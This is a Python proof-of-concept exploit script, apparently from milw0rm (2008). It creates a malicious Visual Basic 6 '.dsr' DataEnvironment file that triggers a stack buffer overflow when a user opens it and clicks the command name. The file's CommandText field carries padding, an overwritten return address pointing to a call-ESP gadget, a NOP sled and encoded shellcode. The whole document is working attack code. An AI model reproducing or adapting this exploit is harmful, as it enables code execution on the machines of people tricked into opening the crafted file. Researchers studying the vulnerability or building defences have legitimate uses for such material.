#usage: exploit.py

print "-----------------------------------------------------------------------"
print ' [PoC 2] MS Visual Basic Enterprise Ed. 6 SP6 ".dsr" File Handling BoF\n'
print " author: shinnai"
print " mail: shinnai[at]autistici[dot]org"
print " site: http://shinnai.altervista.org\n"
print " Once you create the file, open it with Visual Basic 6 and click on"
print " command name."
print "-----------------------------------------------------------------------"

buff = "A" * 555

get_EIP = "\xFF\xBE\x3F\x7E" #call ESP from user32.dll

nop = "\x90" * 12

shellcode = (
    "\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
    "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
    "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
    "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
    "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"
    "\x42\x50\x42\x30\x42\x50\x4b\x38\x45\x44\x4e\x43\x4b\x38\x4e\x47"
    "\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x48\x4f\x54\x4a\x41\x4b\x38"
    "\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x48\x46\x33\x4b\x48"
    "\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x59\x4e\x4a\x46\x48\x42\x4c"
    "\x46\x47\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
    "\x46\x4f\x4b\x43\x46\x35\x46\x52\x46\x30\x45\x37\x45\x4e\x4b\x58"
    "\x4f\x45\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x48\x4e\x30\x4b\x44"
    "\x4b\x48\x4f\x35\x4e\x41\x41\x30\x4b\x4e\x4b\x38\x4e\x51\x4b\x38"
    "\x41\x50\x4b\x4e\x49\x38\x4e\x45\x46\x32\x46\x50\x43\x4c\x41\x33"
    "\x42\x4c\x46\x46\x4b\x48\x42\x34\x42\x33\x45\x38\x42\x4c\x4a\x47"
    "\x4e\x30\x4b\x38\x42\x34\x4e\x50\x4b\x58\x42\x47\x4e\x41\x4d\x4a"
    "\x4b\x58\x4a\x36\x4a\x30\x4b\x4e\x49\x50\x4b\x48\x42\x48\x42\x4b"
    "\x42\x30\x42\x50\x42\x30\x4b\x38\x4a\x56\x4e\x43\x4f\x55\x41\x33"
    "\x48\x4f\x42\x46\x48\x35\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x37"
    "\x42\x55\x4a\x36\x42\x4f\x4c\x58\x46\x50\x4f\x35\x4a\x36\x4a\x59"
    "\x50\x4f\x4c\x38\x50\x50\x47\x55\x4f\x4f\x47\x4e\x43\x56\x41\x56"
    "\x4e\x46\x43\x56\x50\x32\x45\x46\x4a\x37\x45\x36\x42\x50\x5a"
    )

dsrfile = (
    "VERSION 5.00\n"
    "Begin {C0E45035-5775-11D0-B388-00A0C9055D8E} DataEnvironment1\n"
    "   ClientHeight    =   6315\n"
    "   ClientLeft      =   0\n"
    "   ClientTop       =   0\n"
    "   ClientWidth     =   7980\n"
    "   _ExtentX        =   14076\n"
    "   _ExtentY        =   11139\n"
    "   FolderFlags     =   1\n"
    '   TypeLibGuid     =   "{D7133993-3B5A-4667-B63B-749EF16A1840}"\n'
    '   TypeInfoGuid    =   "{050E7898-66AC-4150-A213-47C7725D7E7E}"\n'
    "   TypeInfoCookie  =   0\n"
    "   Version         =   4\n"
    "   NumConnections  =   1\n"
    "   BeginProperty Connection1\n"
    '      ConnectionName  =   "Connection1"\n'
    "      ConnDispId      =   1001\n"
    "      SourceOfData    =   3\n"
    '      ConnectionSource=   ""\n'
    "      Expanded        =   -1  'True\n"
    "      QuoteChar       =   96\n"
    "      SeparatorChar   =   46\n"
    "   EndProperty\n"
    "   NumRecordsets   =   1\n"
    "   BeginProperty Recordset1\n"
    '      CommandName     =   "Command1"\n'
    "      CommDispId      =   1002\n"
    "      RsDispId        =   1003\n"
    '      CommandText     =   "' + buff + get_EIP + nop + shellcode + nop + '"\n'
    '      ActiveConnectionName=   "Connection1"\n'
    "      CommandType     =   2\n"
    "      dbObjectType    =   1\n"
    "      Locktype        =   3\n"
    "      IsRSReturning   =   -1  'True\n"
    "      NumFields       =   1\n"
    "      BeginProperty Field1\n"
    "         Precision       =   10\n"
    "         Size            =   4\n"
    "         Scale           =   0\n"
    "         Type            =   3\n"
    '         Name            =   "ID"\n'
    '         Caption         =   "ID"\n'
    "      EndProperty\n"
    "      NumGroups       =   0\n"
    "      ParamCount      =   0\n"
    "      RelationCount   =   0\n"
    "      AggregateCount  =   0\n"
    "   EndProperty\n"
    "End\n"
    'Attribute VB_Name = "DataEnvironment1"\n'
    "Attribute VB_GlobalNameSpace = False\n"
    "Attribute VB_Creatable = True\n"
    "Attribute VB_PredeclaredId = True\n"
    "Attribute VB_Exposed = False\n"
    )

try:
    out_file = open("DataEnvironment1.dsr",'w')
    out_file.write(dsrfile)
    out_file.close()
    print "\nFILE CREATION COMPLETED!\n"
except:
    print " \n -------------------------------------"
    print "  Usage: exploit.py"
    print " -------------------------------------"
    print "\nAN ERROR OCCURS DURING FILE CREATION!"

# milw0rm.com [2008-04-04]
